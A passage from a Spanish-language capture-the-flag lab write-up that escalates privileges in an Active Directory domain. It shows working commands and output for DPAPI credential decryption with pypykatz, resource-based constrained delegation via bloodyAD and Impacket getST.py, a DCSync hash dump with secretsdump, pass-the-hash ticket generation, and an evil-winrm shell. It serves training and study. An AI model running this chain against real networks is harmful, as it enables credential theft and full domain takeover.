* Con el JSON `mkf` → que contiene tus masterkeys en claro → le dices a `pypykatz` o a `dpapick` que use esas claves para **abrir** el blob Base64 de credenciales (`C4BB…BA6`) y así **ver** la contraseña / token que estaba dentro.
* Ejemplo (simplificado):

  ```bash
  pypykatz dpapi blob --masterkeys-file mkf --file C4BB…BA6
  ```
* Eso devolverá la información en texto claro.

* **DPAPI** usa un sistema de dos capas:

  1. **Masterkeys** cifradas con una clave derivada de la contraseña del usuario.
  2. **Blobs de datos** cifrados con esas masterkeys.

* Nosotros:

  1. Derivamos las “pre-keys” de la contraseña → abrimos las masterkeys.
  2. Juntamos todas las masterkeys descifradas.
  3. Con ellas, abrimos el blob final de credenciales.


Finalmente crackeamos y desencodeamos: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ pypykatz dpapi credential mkf credentialblob
type : GENERIC (1)
last_written : 133622465035169458
target : LegacyGeneric:target=admin_acc
username : vintage\c.neri_adm
unknown4 : b'U\x00n\x00c\x00r\x004\x00c\x00k\x004\x00b\x00l\x003\x00P\x004\x00s\x00s\x00W\x000\x00r\x00d\x000\x003\x001\x002\x00'

                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ python3                                     
Python 3.13.2 (main, Mar 13 2025, 14:29:07) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> data = b'U\x00n\x00c\x00r\x004\x00c\x00k\x004\x00b\x00l\x003\x00P\x004\x00s\x00s\x00W\x000\x00r\x00d\x000\x003\x001\x002\x00'
>>> data.decode('utf-16le')
'Uncr4ck4bl3P4ssW0rd0312'
>>> 
```
Ya podemos agregar esta contraseña a nuestro fichero `credentials.txt`


# **Escalando privilegios** 

Ahora tenemos acceso a la cuenta de `c.neri_adm`, pero no tenemos bastantes permisos para leer lo que hay en el directorio del administrador, así que vamos a intentar acceder al usuario `l.bianchi` que también tiene permisos de administrador. 
Vamos a ejecutar un RBCD attack, agregregando la cuenta `fs01$` al grupo `DelegateAdmins`

Pero antes de ejecutar el ataque, recordemos dos cosas: 

SPN (Service Principal Name): es el identificador único que vincula una cuenta (usuario o equipo) con un servicio Kerberos. Por ejemplo, cifs/dc01.vintage.htb está ligado al servicio SMB del controlador de dominio.

Delegación: permite que un servicio (“delegador”) actúe en nombre de otro usuario para solicitar tickets a otros servicios. Hay varios tipos:

- Unconstrained Delegation: el más amplio y peligroso.
- Constrained Delegation: limitas a qué SPNs puede llamar.
- Resource-Based Constrained Delegation (RBCD): se configura en el objeto del recurso (no en el del servicio), y es lo que aprovecharemos aqui.

**Ahora si, vamos a añadir la cuenta de equipo fs01$ al grupo DelegatedAdmins, con esto estamos diciendo que fs01$ puede pedir tickets en nombre de cuentas privilegiadas.**

```bash 
┌──(kali㉿kali)-[~/labs-hack/vintage]
└─$ bloodyAD -d vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' --host dc01.vintage.htb -k add groupMember DelegatedAdmins 'fs01$' 
[+] fs01$ added to DelegatedAdmins
```

**Ahora usamos el script `getST.py` de impacket:**
El script getST.py de Impacket automatiza dos extensiones de Kerberos:

- S4U2Self: el servicio (aquí, fs01$) se pide a sí mismo un ticket de servicio (“service ticket”) en nombre de otro principal (por ejemplo, dc01$ o l.bianchi_adm) sin necesidad de las credenciales de ese usuario.
- S4U2Proxy: con ese “ticket de servicio”, ya puedes solicitar un ticket para otro servicio de la red (por ejemplo, cifs/dc01.vintage.htb).

> dc01$ es la cuenta de equipo (machine account) del controlador de dominio (DC01.vintage.htb).
> Toda cuenta de equipo en AD tiene su propio par de claves Kerberos, igual que un usuario, y su SPN suele ser el nombre DNS del host (por ejemplo, HOST/dc01.vintage.htb o cifs/dc01.vintage.htb).

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' -dc-ip 10.10.11.45 'vintage.htb/fs01$:fs01' 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc01$
/home/kali/labs-hack/vintage/blood/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/labs-hack/vintage/blood/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self
/home/kali/labs-hack/vintage/blood/bin/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/labs-hack/vintage/blood/bin/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```
En Impacket, esto es lo que hace internamente

getST.py -spn cifs/dc01.vintage.htb -impersonate dc01$ …
a pesar de que el SPN parezca apuntar a dc01$, realmente el ticket es para el SPN de la cuenta que poseemos (fs01$), pero con el PAC de dc01$.

Objetivo: convertir ese ticket “impersonado” (que dice que somos dc01$) en un ticket para otro servicio de red (por ejemplo, CIFS en el controlador).

- Enviamos otro TGS_REQ al KDC, pero esta vez presentamos el ticket S4U2Self (el que dice “yo soy dc01$”) como prueba.
- Solicitamos un ticket para el servicio destino: cifs/dc01.vintage.htb.
- El KDC valida que, dado que fs01$ (delegado) está autorizado para actuar en nombre de dc01$ sobre ese servicio, puede emitir el ticket.
- Recibimos un Service Ticket válido para CIFS en DC, con PAC de dc01$, de modo que cuando lo presentemos al servicio SMB en dc01, el servidor nos tratará como se de la máquina dc01$ se tratase. 


El resultado es un archivo de credenciales Kerberos (.ccache) que otorga un ticket válido para actuar como dc01$ ante el servicio SMB.
Con el Ticket₂ ya tenemos suficiente autoridad para llamar a la API de replicación DCSync y volcar los hashes de usuarios, entre ellos l.bianchi_adm.

**Volcado de credenciales con `Secrets.dump`**

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ KRB5CCNAME='dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache' secretsdump.py -k dc01.vintage.htb 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:0ae29a5cdfa7d5b72464dc92ffeaa8d1:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
<SNIP>
```

– -k le dice a Impacket que use Kerberos en vez de NTLM.
– Gracias a la delegación y al SPN, el ticket de dc01$ tiene permiso DRSUAPI, así que podemos hacer un DCSync, es decir, leer el NTDS.DIT del controlador de dominio y volcar todos los hashes de la base de datos de AD.

De aqui obtenemos el hash de L.Bianchi_adm:6b75….


**Generamos un TGT para `L.bianchi_adm`, necesario para autenticarnos y poder autenticarnos con `evilwin-rm`**

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ getTGT.py -hashes :6b751449807e0d73065b0423b64687f0 vintage.htb/l.bianchi_adm@vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in l.bianchi_adm@vintage.htb.ccache
```

Y ya podemos acceder con evil-winrm: 

```bash 
┌──(blood)─(kali㉿kali)-[~/labs-hack/vintage]
└─$ KRB5CCNAME='l.bianchi_adm@vintage.htb.ccache' evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> whoami
vintage\l.bianchi_adm
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Desktop> cd c:\users\administrator\desktop\
*Evil-WinRM* PS C:\users\administrator\desktop> dir 


    Directory: C:\users\administrator\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          5/2/2025  12:02 PM             34 root.txt
```



